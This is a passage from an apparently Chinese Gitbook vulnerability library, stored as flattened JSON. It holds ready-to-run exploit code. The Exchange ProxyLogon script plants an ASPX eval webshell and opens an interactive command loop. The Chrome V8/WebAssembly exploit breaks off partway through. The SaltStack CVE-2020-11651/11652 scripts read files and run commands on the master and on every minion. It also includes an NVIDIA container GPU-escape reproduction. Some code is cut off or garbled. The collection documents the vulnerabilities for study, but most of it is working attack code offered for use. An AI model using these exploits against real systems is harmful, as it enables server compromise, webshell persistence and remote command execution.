可以看到首先请求了 /rpc/ 这个目录 根据网上公布的 POC与EXP，可以看到 NTML协商消息会返回我们NTML询问信息， 其中包含了 AV_PAIR结构，其中包含了 后端服务器名称与域名 base64解密其中的加密部分 在通过解包的方法转换其中的数据就可以得到完整的后端服务器名称与域名 后面的大家就参考文章和EXP来研究原理吧，几篇文章和EXP已经很完整了 漏洞利用POC [!NOTE] EXP根据推特和Github几个脚本更改 默认打的邮箱为 administrator@xxx.xxx.cn(可以自行更改) webshell路径和脚本文件中更改 运行的命令是 ping Dnslog证明漏洞存在(一些东西就大家自己看看脚本改吧~) #!/usr/bin/python2 # coding: UTF-8 import re import sys import json import string import requests from urllib import urlencode from tld import get_fld from struct import unpack from base64 import b64encode, b64decode from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Microsoft Exchang 多个版本 \\033[0m') print('+ \\033[36m使用格式: python poc.py \\033[0m') print('+ \\033[36mUrl >>> mail.xxx.org \\033[0m') print('+ \\033[36mEmail >>> Administrator@根域名 (默认) \\033[0m') print('+------------------------------------------') def _unpack_str(byte_string): return byte_string.decode('UTF-8').replace('\\x00', '') def _unpack_int(format, data): return unpack(format, data)[0] def parse_challenge(Negotiate_base64_decode): target_info_field = Negotiate_base64_decode[40:48] target_info_len = _unpack_int('H', target_info_field[0:2]) target_info_offset = _unpack_int('I', target_info_field[4:8]) target_info_bytes = Negotiate_base64_decode[target_info_offset:target_info_offset + target_info_len] domain_name = '' computer_name = '' info_offset = 0 while info_offset %s http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a ''' % Email vuln_url = '/autodiscover/autodiscover.xml' headers = { 'User-Agent': 'ExchangeServicesClient/0.0.0.0', 'Content-Type': 'text/xml', 'Cookie': 'X-BEResource=a]@{}:444{}?#~1941962753'.format(computer_name, vuln_url), 'msExchLogonMailbox': 'S-1-5-20' } url = \"https://{}/ecp/PeiQi.js\".format(target_url) requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url, headers=headers, data=payload, verify=False, allow_redirects=False) LegacyDN = re.findall(r'(.*?)', response.text)[0] print(\"\\033[32m[o] LegacyDN: {}\\033[0m\".format(LegacyDN)) vuln_url = '/mapi/emsmdb/' headers = { 'X-Clientapplication': 'Outlook/15.0.4815.1002', 'X-Requestid': 'x', 'X-Requesttype': 'Connect', 'Cookie': 'X-BEResource=a]@{}:444{}?#~1941962753'.format(computer_name, vuln_url), 'Content-Type': 'application/mapi-http', 'msExchLogonMailbox': 'S-1-5-20', } payload = LegacyDN + '\\x00\\x00\\x00\\x00\\x00\\x20\\x04\\x00\\x00\\x09\\x04\\x00\\x00\\x09\\x04\\x00\\x00\\x00\\x00\\x00\\x00' url = \"https://{}/ecp/PeiQi.js\".format(target_url) requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url, headers=headers, data=payload, verify=False, allow_redirects=False) SID = re.search('with SID ([S\\-0-9]+) ', response.content).group(1) print(\"\\033[32m[o] SID: {}\\033[0m\".format(SID)) vuln_url = '/ecp/proxyLogon.ecp' payload = '%s' % (Email.split('@')[0], SID) headers = { 'X-Clientapplication': 'Outlook/15.0.4815.1002', 'X-Requestid': 'x', 'X-Requesttype': 'Connect', 'Cookie': 'X-BEResource=a]@{}:444{}?#~1941962753'.format(computer_name, vuln_url), 'Content-Type': 'application/json', 'msExchLogonMailbox': 'S-1-5-20', } url = \"https://{}/ecp/PeiQi.js\".format(target_url) requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url, headers=headers, data=payload, verify=False, allow_redirects=False) session_id = response.cookies.get('ASP.NET_SessionId') canary = response.cookies.get('msExchEcpCanary') print(\"\\033[32m[o] Session_id: {}\\033[0m\".format(session_id)) print(\"\\033[32m[o] Canary : {}\\033[0m\".format(canary)) extra_cookies = [ 'ASP.NET_SessionId=' + session_id, 'msExchEcpCanary=' + canary ] vuln_url = '/ecp/DDI/DDIService.svc/GetObject' qs = urlencode({ 'schema': 'OABVirtualDirectory', 'msExchEcpCanary': canary }) headers = { 'X-Clientapplication': 'Outlook/15.0.4815.1002', 'X-Requestid': 'x', 'X-Requesttype': 'Connect', 'Cookie': 'X-BEResource=a]@{}:444{}?{}#~1941962753;ASP.NET_SessionId={};msExchEcpCanary={}'.format( computer_name, vuln_url, qs, session_id, canary), 'Content-Type': 'application/json', 'msExchLogonMailbox': 'S-1-5-20', } url = \"https://{}/ecp/PeiQi.js\".format(target_url) requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url, headers=headers, data='', verify=False, allow_redirects=False) identity = response.json()['d']['Output'][0]['Identity'] print(\"\\033[32m[o] OAB Name: {}\\033[0m\".format(identity['DisplayName'])) print(\"\\033[32m[o] OAB ID: {}\\033[0m\".format(identity['RawIdentity'])) FILE_PATH = 'C:\\\\inetpub\\\\wwwroot\\\\aspnet_client\\\\PeiQi.aspx' FILE_DATA = 'function Page_Load(){eval(Request[\"PeiQi\"],\"unsafe\");}' vuln_url = '/ecp/DDI/DDIService.svc/SetObject' qs = urlencode({ 'schema': 'OABVirtualDirectory', 'msExchEcpCanary': canary }) payload = json.dumps({ 'identity': { '__type': 'Identity:ECP', 'DisplayName': identity['DisplayName'], 'RawIdentity': identity['RawIdentity'] }, 'properties': { 'Parameters': { '__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel', 'ExternalUrl': 'http://f/' + FILE_DATA } } }) headers = { 'X-Clientapplication': 'Outlook/15.0.4815.1002', 'X-Requestid': 'x', 'X-Requesttype': 'Connect', 'Cookie': 'X-BEResource=a]@{}:444{}?{}#~1941962753;ASP.NET_SessionId={};msExchEcpCanary={}'.format( computer_name, vuln_url, qs, session_id, canary), 'Content-Type': 'application/json', 'msExchLogonMailbox': 'S-1-5-20', } url = \"https://{}/ecp/PeiQi.js\".format(target_url) requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url, headers=headers, data=payload, verify=False, allow_redirects=False) if response.status_code == 200: print(\"\\033[32m[o] 通过OAB设置Webshell成功\\033[0m\") vuln_url = \"/ecp/DDI/DDIService.svc/SetObject\" qs = urlencode({ 'schema': 'ResetOABVirtualDirectory', 'msExchEcpCanary': canary }) payload = json.dumps({ 'identity': { '__type': 'Identity:ECP', 'DisplayName': identity['DisplayName'], 'RawIdentity': identity['RawIdentity'] }, 'properties': { 'Parameters': { '__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel', 'FilePathName': FILE_PATH } } }) headers = { 'X-Clientapplication': 'Outlook/15.0.4815.1002', 'X-Requestid': 'x', 'X-Requesttype': 'Connect', 'Cookie': 'X-BEResource=a]@{}:444{}?{}#~1941962753;ASP.NET_SessionId={};msExchEcpCanary={}'.format( computer_name, vuln_url, qs, session_id, canary), 'Content-Type': 'application/json', 'msExchLogonMailbox': 'S-1-5-20', } url = \"https://{}/ecp/PeiQi.js\".format(target_url) requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url, headers=headers, data=payload, verify=False, allow_redirects=False) if response.status_code == 200: print(\"\\033[32m[o] 正在尝试写入Webshell\\033[0m\") vuln_url = \"/ecp/DDI/DDIService.svc/SetObject\" qs = urlencode({ 'schema': 'OABVirtualDirectory', 'msExchEcpCanary': canary }) payload = json.dumps({ 'identity': { '__type': 'Identity:ECP', 'DisplayName': identity['DisplayName'], 'RawIdentity': identity['RawIdentity'] }, 'properties': { 'Parameters': { '__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel', 'ExternalUrl': '' } } }) headers = { 'X-Clientapplication': 'Outlook/15.0.4815.1002', 'X-Requestid': 'x', 'X-Requesttype': 'Connect', 'Cookie': 'X-BEResource=a]@{}:444{}?{}#~1941962753;ASP.NET_SessionId={};msExchEcpCanary={}'.format( computer_name, vuln_url, qs, session_id, canary), 'Content-Type': 'application/json', 'msExchLogonMailbox': 'S-1-5-20', } url = \"https://{}/ecp/PeiQi.js\".format(target_url) requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url, headers=headers, data=payload, verify=False, allow_redirects=False) print(\"\\033[32m[o] 清除 OAB\\033[0m\") print(\"\\033[32m[o] 正在验证 Webshell是否上传成功..........\\033[0m\") webshell_url = \"https://\" + target_url + \"/aspnet_client/PeiQi.aspx\" requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=webshell_url, verify=False, allow_redirects=False) if response.status_code == 200 and \"Name\" in response.text: print(\"\\033[32m[o] 上传 Webshll成功, 地址为:{}\\033[0m\".format(\"https://\" + target_url + \"/aspnet_client/PeiQi.aspx\")) print(\"\\033[32m[o] 响应为:\\n{}\\033[0m\".format(response.text)) while True: Cmd = str(raw_input(\"\\033[35mCmd >>> \\033[0m\")) requests.packages.urllib3.disable_warnings(InsecureRequestWarning) Cmd_url = \"https://\" + target_url + '/aspnet_client/PeiQi.aspx?PeiQi=Response.Write(new%20ActiveXObject(\"WScript.Shell\").exec(\"cmd /c {}\").StdOut.ReadAll());'.format(Cmd) response = requests.get(url=Cmd_url, verify=False, allow_redirects=False) print(\"\\033[32m[o] 响应为:\\n{}\\033[0m\".format(response.text)) if __name__ == '__main__': reload(sys) sys.setdefaultencoding('utf8') title() target_url = str(raw_input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) Email = \"Administrator@{}\".format(get_fld(\"https://\" + target_url)) print(\"\\033[32m[o] 请求地址:{}，使用的邮箱:{}\\033[0m\".format(target_url, Email)) POC_1(target_url, Email) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/服务器应用漏洞/NVIDIA/":{"url":"book/服务器应用漏洞/NVIDIA/","title":"NVIDIA","keywords":"","body":"NVIDIA NVIDIA GPU显示驱动程序 信息泄露 CVE-2021-1056 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/服务器应用漏洞/NVIDIA/NVIDIA GPU显示驱动程序 信息泄露 CVE-2021-1056.html":{"url":"book/服务器应用漏洞/NVIDIA/NVIDIA GPU显示驱动程序 信息泄露 CVE-2021-1056.html","title":"NVIDIA GPU显示驱动程序 信息泄露 CVE-2021-1056","keywords":"","body":"NVIDIA GPU显示驱动程序 信息泄露 CVE-2021-1056 漏洞描述 用于Linux的NVIDIA GPU显示驱动程序在内核模式层（nvidia.ko）中包含一个漏洞，在该漏洞中，它没有完全遵守操作系统文件系统提供GPU设备级隔离的权限，这可能导致拒绝服务或信息泄露。 漏洞影响 [!NOTE] NVIDIA GPU显示驱动程序 环境搭建 Dokcer版本: 19.03 git clone https://github.com/pokerfaceSad/CVE-2021-1056.git cd CVE-2021-1056 docker run --gpus 1 -v $PWD:/CVE-2021-1056 -it tensorflow/tensorflow:1.13.2-gpu bash 漏洞复现 进入容器检查 GPU状态，只有一块GPU In Container# nvidia-smi Sat Jan 9 07:21:03 2021 +-----------------------------------------------------------------------------+ | NVIDIA-SMI 450.51.05 Driver Version: 450.51.05 CUDA Version: 11.0 | |-------------------------------+----------------------+----------------------+ | GPU Name Persistence-M| Bus-Id Disp.A | Volatile Uncorr. ECC | | Fan Temp Perf Pwr:Usage/Cap| Memory-Usage | GPU-Util Compute M. | | | | MIG M. | |===============================+======================+======================| | 0 Tesla V100-PCIE... Off | 00000000:02:00.0 Off | 0 | | N/A 27C P0 23W / 250W | 0MiB / 32510MiB | 0% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ +-----------------------------------------------------------------------------+ | Processes: | | GPU GI CI PID Type Process name GPU Memory | | ID ID Usage | |=============================================================================| | No running processes found | +-----------------------------------------------------------------------------+ 在容器中执行漏洞利用脚本，在最后的nvidia-smi的输出中可以看到宿主机所有GPU在容器中都已经可见了 In Container# bash /CVE-2021-1056/main.sh [INFO] init GPU num: 1 [DEBUG] /dev/nvidia0 exists, skip [DEBUG] successfully get /dev/nvidia1 [DEBUG] successfully get /dev/nvidia2 [DEBUG] successfully get /dev/nvidia3 [DEBUG] delete redundant /dev/nvidia4 [INFO] get extra 3 GPU devices from host [INFO] current GPU num: 4 [INFO] exec nvidia-smi: Sat Jan 9 07:22:43 2021 +-----------------------------------------------------------------------------+ | NVIDIA-SMI 450.51.05 Driver Version: 450.51.05 CUDA Version: 11.0 | |-------------------------------+----------------------+----------------------+ | GPU Name Persistence-M| Bus-Id Disp.A | Volatile Uncorr. ECC | | Fan Temp Perf Pwr:Usage/Cap| Memory-Usage | GPU-Util Compute M. | | | | MIG M. | |===============================+======================+======================| | 0 Tesla V100-PCIE... Off | 00000000:02:00.0 Off | 0 | | N/A 27C P0 23W / 250W | 0MiB / 32510MiB | 0% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 1 Tesla V100-PCIE... Off | 00000000:03:00.0 Off | 0 | | N/A 30C P0 25W / 250W | 0MiB / 32510MiB | 0% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 2 Tesla V100-PCIE... Off | 00000000:82:00.0 Off | 0 | | N/A 29C P0 25W / 250W | 0MiB / 32510MiB | 0% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 3 Tesla V100-PCIE... Off | 00000000:83:00.0 Off | 0 | | N/A 28C P0 25W / 250W | 0MiB / 32510MiB | 0% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ +-----------------------------------------------------------------------------+ | Processes: | | GPU GI CI PID Type Process name GPU Memory | | ID ID Usage | |=============================================================================| | No running processes found | +-----------------------------------------------------------------------------+ 为了验证这些GPU确实是可用的，执行一个tensorflow的demo，可以看到所有的GPU确实可以被容器中的进程使用 In Container# nohup python /CVE-2021-1056/tf_distr_demo.py > log 2>&1 & In Container$ nvidia-smi Sat Jan 9 18:58:23 2021 +-----------------------------------------------------------------------------+ | NVIDIA-SMI 450.51.05 Driver Version: 450.51.05 CUDA Version: 11.0 | |-------------------------------+----------------------+----------------------+ | GPU Name Persistence-M| Bus-Id Disp.A | Volatile Uncorr. ECC | | Fan Temp Perf Pwr:Usage/Cap| Memory-Usage | GPU-Util Compute M. | | | | MIG M. | |===============================+======================+======================| | 0 Tesla V100-PCIE... Off | 00000000:02:00.0 Off | 0 | | N/A 32C P0 36W / 250W | 31117MiB / 32510MiB | 1% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 1 Tesla V100-PCIE... Off | 00000000:03:00.0 Off | 0 | | N/A 33C P0 35W / 250W | 31117MiB / 32510MiB | 1% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 2 Tesla V100-PCIE... Off | 00000000:82:00.0 Off | 0 | | N/A 33C P0 36W / 250W | 31117MiB / 32510MiB | 1% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ | 3 Tesla V100-PCIE... Off | 00000000:83:00.0 Off | 0 | | N/A 32C P0 37W / 250W | 31117MiB / 32510MiB | 1% Default | | | | N/A | +-------------------------------+----------------------+----------------------+ +-----------------------------------------------------------------------------+ | Processes: | | GPU GI CI PID Type Process name GPU Memory | | ID ID Usage | |=============================================================================| +-----------------------------------------------------------------------------+ 参考文章 https://github.com/pokerfaceSad/CVE-2021-1056/blob/master/docs/QuickStart.md 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/服务器应用漏洞/QEMU/":{"url":"book/服务器应用漏洞/QEMU/","title":"QEMU","keywords":"","body":"QEMU 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:50:07 "},"book/服务器应用漏洞/QEMU/QEMU 虚拟机逃逸漏洞 CVE-2020-14364.html":{"url":"book/服务器应用漏洞/QEMU/QEMU 虚拟机逃逸漏洞 CVE-2020-14364.html","title":"QEMU 虚拟机逃逸漏洞 CVE-2020-14364","keywords":"","body":"QEMU 虚拟机逃逸漏洞 CVE-2020-14364 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:50:07 "},"book/服务器应用漏洞/Chrome/":{"url":"book/服务器应用漏洞/Chrome/","title":"Chrome","keywords":"","body":"Chrome Windows Chrome 远程命令执行漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/服务器应用漏洞/Chrome/Windows Chrome 远程命令执行漏洞.html":{"url":"book/服务器应用漏洞/Chrome/Windows Chrome 远程命令执行漏洞.html","title":"Windows Chrome 远程命令执行漏洞","keywords":"","body":"Chrome 远程命令执行漏洞 漏洞描述 Windows Chrome 0day 在 2021-4-13 被公开 漏洞影响 [!NOTE] Window Chrome 浏览器 漏洞复现 Github： https://github.com/r4j0x00/exploits/tree/master/chrome-0day 推特: https://twitter.com/r4j0x00/status/1381643526010597380?s=12 exp.html exp.js /* /* BSD 2-Clause License Copyright (c) 2021, rajvardhan agarwal All rights reserved. Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met: 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer. 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution. THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. */ var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]) var wasm_mod = new WebAssembly.Module(wasm_code); var wasm_instance = new WebAssembly.Instance(wasm_mod); var f = wasm_instance.exports.main; var buf = new ArrayBuffer(8); var f64_buf = new Float64Array(buf); var u64_buf = new Uint32Array(buf); let buf2 = new ArrayBuffer(0x150); function ftoi(val) { f64_buf[0] = val; return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) > 32n); return f64_buf[0]; } const _arr = new Uint32Array([2**31]); function foo(a) { var x = 1; x = (_arr[0] ^ 0) + 1; x = Math.abs(x); x -= 2147483647; x = Math.max(x, 0); x -= 1; if(x==-1) x = 0; var arr = new Array(x); arr.shift(); var cor = [1.1, 1.2, 1.3]; return [arr, cor]; } for(var i=0;i ` 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/服务器应用漏洞/Saltstack/":{"url":"book/服务器应用漏洞/Saltstack/","title":"Saltstack","keywords":"","body":"Saltstack Saltstack 远程命令执行漏洞 CVE-2020-11651/11652 SaltStack 未授权访问命令执行漏洞 CVE-2020-16846/25592 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/服务器应用漏洞/Saltstack/Saltstack 远程命令执行漏洞 CVE-2020-11651 11652.html":{"url":"book/服务器应用漏洞/Saltstack/Saltstack 远程命令执行漏洞 CVE-2020-11651 11652.html","title":"Saltstack 远程命令执行漏洞 CVE-2020-11651/11652","keywords":"","body":"Saltstack 远程命令执行漏洞 CVE-2020-11651/11652 漏洞描述 SaltStack 是基于 Python 开发的一套C/S架构配置管理工具。国外某安全团队披露了 SaltStack 存在认证绕过漏洞（CVE-2020-11651）和目录遍历漏洞（CVE-2020-11652）。 在 CVE-2020-11651 认证绕过漏洞中，攻击者通过构造恶意请求，可以绕过 Salt Master 的验证逻辑，调用相关未授权函数功能，从而可以造成远程命令执行漏洞。 在 CVE-2020-11652 目录遍历漏洞中，攻击者通过构造恶意请求，可以读取、写入服务器上任意文件。 漏洞影响 [!NOTE] SaltStack Version SaltStack Version 环境搭建 [!NOTE] git clone https://github.com/vulhub/vulhub.git cd vulhub/saltstack/CVE-2020-11652 docker-compose up -d 漏洞复现 salt-master普遍使用这两行代码进行认证，其中clear_load是可控输入点。 auth_type, err_name, key, sensitive_load_keys = self._prep_auth_info(clear_load) auth_check = self.loadauth.check_authentication(clear_load, auth_type, key=key) _prep_auth_info首先会识别clear_load输入的字段并选用其中之一作为认证方式，然后传参到check_authentication方法检验认证是否有效。 在第三种认证方式auth_type=='user'中，会由_prep_auth_info获取到系统opt的key，传递到check_authentication中和API参数中携带的key进行==比对。 理论上_prep_auth_info是不可被外部调用的，漏洞成因即是攻击者通过匿名API直接调用_prep_auth_info方法，在回显中拿到self.key，并在后续的请求中使用获取到的key过验证，以root权限执行高危指令。 Mworker daemon进程处理API请求： class MWorker(salt.utils.process.SignalHandlingProcess): \"\"\" The worker multiprocess instance to manage the backend operations for the salt master. \"\"\" 其中 _handle_clear & _handle_aes 函数分别处理明文和加密指令： 在这里，self._clear_funcs 是 class ClearFuncs 的实例，在这里API访问者可以无认证调用任意的类函数。 class ClearFuncs(TransportMethods): \"\"\" Set up functions that are safe to execute when commands sent to the master without encryption and authentication \"\"\" ClearFuncs._prep_auth_info()将self.key返回给API造成泄露。攻击者可先通过这一方法拿到key，然后通过认证接口下发shell指令。 之前存在漏洞的代码中仅过滤掉__开头的private方法，导致_prep_auth_info泄露，patch中对clearfuncs和aesfuncs两个类添加了expose白名单过滤： 这里使用 POC 来复线 下载地址: https://github.com/jasperla/CVE-2020-11651-poc 读取文件 /etc/passwd 反弹shell（这里使用另一个POC） 下载地址: https://github.com/heikanet/CVE-2020-11651-CVE-2020-11652-EXP/blob/master/CVE-2020-11651.py 漏洞利用POC 下载地址 # BASE https://github.com/bravery9/SaltStack-Exp # 微信公众号：台下言书 # -*- coding:utf-8 -*- - from __future__ import absolute_import, print_function, unicode_literals import argparse import os import sys import datetime import salt import salt.version import salt.transport.client import salt.exceptions DEBUG = False def init_minion(master_ip, master_port): minion_config = { 'transport': 'zeromq', 'pki_dir': '/tmp', 'id': 'root', 'log_level': 'debug', 'master_ip': master_ip, 'master_port': master_port, 'auth_timeout': 5, 'auth_tries': 1, 'master_uri': 'tcp://{0}:{1}'.format(master_ip, master_port) } return salt.transport.client.ReqChannel.factory(minion_config, crypt='clear') def check_salt_version(): print(\"[+] Salt 版本: {}\".format(salt.version.__version__)) vi = salt.version.__version_info__ if (vi 下载地址 #!/usr/bin/env python # # Exploit for CVE-2020-11651 and CVE-2020-11652 # Written by Jasper Lievisse Adriaanse (https://github.com/jasperla/CVE-2020-11651-poc) # This exploit is based on this checker script: # https://github.com/rossengeorgiev/salt-security-backports from __future__ import absolute_import, print_function, unicode_literals import argparse import datetime import os import os.path import sys import time import salt import salt.version import salt.transport.client import salt.exceptions def init_minion(master_ip, master_port): minion_config = { 'transport': 'zeromq', 'pki_dir': '/tmp', 'id': 'root', 'log_level': 'debug', 'master_ip': master_ip, 'master_port': master_port, 'auth_timeout': 5, 'auth_tries': 1, 'master_uri': 'tcp://{0}:{1}'.format(master_ip, master_port) } return salt.transport.client.ReqChannel.factory(minion_config, crypt='clear') # --- check funcs ---- def check_connection(master_ip, master_port, channel): print(\"[+] Checking salt-master ({}:{}) status... \".format(master_ip, master_port), end='') sys.stdout.flush() # connection check try: channel.send({'cmd':'ping'}, timeout=2) except salt.exceptions.SaltReqTimeoutError: print(\"OFFLINE\") sys.exit(1) else: print(\"ONLINE\") def check_CVE_2020_11651(channel): print(\"[+] Checking if vulnerable to CVE-2020-11651... \", end='') sys.stdout.flush() try: rets = channel.send({'cmd': '_prep_auth_info'}, timeout=3) except: print('ERROR') return None else: pass finally: if rets: print('YES') root_key = rets[2]['root'] return root_key print('NO') return None def check_CVE_2020_11652_read_token(debug, channel, top_secret_file_path): print(\"[+] Checking if vulnerable to CVE-2020-11652 (read_token)... \", end='') sys.stdout.flush() # try read file msg = { 'cmd': 'get_token', 'arg': [], 'token': top_secret_file_path, } try: rets = channel.send(msg, timeout=3) except salt.exceptions.SaltReqTimeoutError: print(\"YES\") except: print(\"ERROR\") raise else: if debug: print() print(rets) print(\"NO\") def check_CVE_2020_11652_read(debug, channel, top_secret_file_path, root_key): print(\"[+] Checking if vulnerable to CVE-2020-11652 (read)... \", end='') sys.stdout.flush() # try read file msg = { 'key': root_key, 'cmd': 'wheel', 'fun': 'file_roots.read', 'path': top_secret_file_path, 'saltenv': 'base', } try: rets = channel.send(msg, timeout=3) except salt.exceptions.SaltReqTimeoutError: print(\"TIMEOUT\") except: print(\"ERROR\") raise else: if debug: print() print(rets) if rets['data']['return']: print(\"YES\") else: print(\"NO\") def check_CVE_2020_11652_write1(debug, channel, root_key): print(\"[+] Checking if vulnerable to CVE-2020-11652 (write1)... \", end='') sys.stdout.flush() # try read file msg = { 'key': root_key, 'cmd': 'wheel', 'fun': 'file_roots.write', 'path': '../../../../../../../../tmp/salt_CVE_2020_11652', 'data': 'evil', 'saltenv': 'base', } try: rets = channel.send(msg, timeout=3) except salt.exceptions.SaltReqTimeoutError: print(\"TIMEOUT\") except: print(\"ERROR\") raise else: if debug: print() print(rets) pp(rets) if rets['data']['return'].startswith('Wrote'): try: os.remove('/tmp/salt_CVE_2020_11652') except OSError: print(\"Maybe?\") else: print(\"YES\") else: print(\"NO\") def check_CVE_2020_11652_write2(debug, channel, root_key): print(\"[+] Checking if vulnerable to CVE-2020-11652 (write2)... \", end='') sys.stdout.flush() # try read file msg = { 'key': root_key, 'cmd': 'wheel', 'fun': 'config.update_config', 'file_name': '../../../../../../../../tmp/salt_CVE_2020_11652', 'yaml_contents': 'evil', 'saltenv': 'base', } try: rets = channel.send(msg, timeout=3) except salt.exceptions.SaltReqTimeoutError: print(\"TIMEOUT\") except: print(\"ERROR\") raise else: if debug: print() print(rets) if rets['data']['return'].startswith('Wrote'): try: os.remove('/tmp/salt_CVE_2020_11652.conf') except OSError: print(\"Maybe?\") else: print(\"YES\") else: print(\"NO\") def pwn_read_file(channel, root_key, path, master_ip): print(\"[+] Attemping to read {} from {}\".format(path, master_ip)) sys.stdout.flush() msg = { 'key': root_key, 'cmd': 'wheel', 'fun': 'file_roots.read', 'path': path, 'saltenv': 'base', } rets = channel.send(msg, timeout=3) print(rets['data']['return'][0][path]) def pwn_upload_file(channel, root_key, src, dest, master_ip): print(\"[+] Attemping to upload {} to {} on {}\".format(src, dest, master_ip)) sys.stdout.flush() try: fh = open(src, 'rb') payload = fh.read() fh.close() except Exception as e: print('[-] Failed to read {}: {}'.format(src, e)) return msg = { 'key': root_key, 'cmd': 'wheel', 'fun': 'file_roots.write', 'saltenv': 'base', 'data': payload, 'path': dest, } rets = channel.send(msg, timeout=3) print('[ ] {}'.format(rets['data']['return'])) def pwn_exec(channel, root_key, cmd, master_ip, jid): print(\"[+] Attemping to execute {} on {}\".format(cmd, master_ip)) sys.stdout.flush() msg = { 'key': root_key, 'cmd': 'runner', 'fun': 'salt.cmd', 'saltenv': 'base', 'user': 'sudo_user', 'kwarg': { 'fun': 'cmd.exec_code', 'lang': 'python', 'code': \"import subprocess;subprocess.call('{}',shell=True)\".format(cmd) }, 'jid': jid, } try: rets = channel.send(msg, timeout=3) except Exception as e: print('[-] Failed to submit job') return if rets.get('jid'): print('[+] Successfully scheduled job: {}'.format(rets['jid'])) def pwn_exec_all(channel, root_key, cmd, master_ip, jid): print(\"[+] Attemping to execute '{}' on all minions connected to {}\".format(cmd, master_ip)) sys.stdout.flush() msg = { 'key': root_key, 'cmd': '_send_pub', 'fun': 'cmd.run', 'user': 'root', 'arg': [ \"/bin/sh -c '{}'\".format(cmd) ], 'tgt': '*', 'tgt_type': 'glob', 'ret': '', 'jid': jid } try: rets = channel.send(msg, timeout=3) except Exception as e: print('[-] Failed to submit job') return finally: if rets == None: print('[+] Successfully submitted job to all minions.') else: print('[-] Failed to submit job') def main(): parser = argparse.ArgumentParser(description='Saltstack exploit for CVE-2020-11651 and CVE-2020-11652') parser.add_argument('--master', '-m', dest='master_ip', default='127.0.0.1') parser.add_argument('--port', '-p', dest='master_port', default='4506') parser.add_argument('--force', '-f', dest='force', default=False, action='store_false') parser.add_argument('--debug', '-d', dest='debug', default=False, action='store_true') parser.add_argument('--run-checks', '-c', dest='run_checks', default=False, action='store_true') parser.add_argument('--read', '-r', dest='read_file') parser.add_argument('--upload-src', dest='upload_src') parser.add_argument('--upload-dest', dest='upload_dest') parser.add_argument('--exec', dest='exec', help='Run a command on the master') parser.add_argument('--exec-all', dest='exec_all', help='Run a command on all minions') args = parser.parse_args() print(\"[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.\") time.sleep(1) # Both src and destination are required for uploads if (args.upload_src and args.upload_dest is None) or (args.upload_dest and args.upload_src is None): print('[-] Must provide both --upload-src and --upload-dest') sys.exit(1) channel = init_minion(args.master_ip, args.master_port) check_connection(args.master_ip, args.master_port, channel) root_key = check_CVE_2020_11651(channel) if 